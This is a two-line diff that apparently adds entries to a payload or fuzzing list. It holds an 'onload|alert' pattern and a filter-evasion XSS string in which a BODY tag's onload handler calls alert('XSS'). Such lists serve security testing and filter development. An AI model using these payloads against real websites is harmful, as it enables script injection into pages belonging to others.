@@ -1,0 +1,2 @@
+onload|alert
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
